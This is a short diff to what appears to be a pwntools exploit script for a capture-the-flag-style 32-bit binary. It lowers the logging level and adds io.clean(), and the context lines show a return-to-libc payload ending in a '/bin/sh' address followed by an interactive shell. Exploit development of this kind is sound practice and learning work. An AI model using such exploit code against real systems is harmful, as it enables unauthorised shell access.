@@ -9,7 +9,7 @@ libc = ELF("./libc6-i386_2.39-0ubuntu8.3_amd64.so")
 context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
 
 filterwarnings("ignore")
-context.log_level = 'debug'
+context.log_level = 'info'
 
 def start(argv=[], *a, **kw):
     if args.GDB:
@@ -58,6 +58,7 @@ def solve():
     payload += p32(sh)
 
     io.sendline(payload)
+    io.clean()
 
     io.interactive()
 
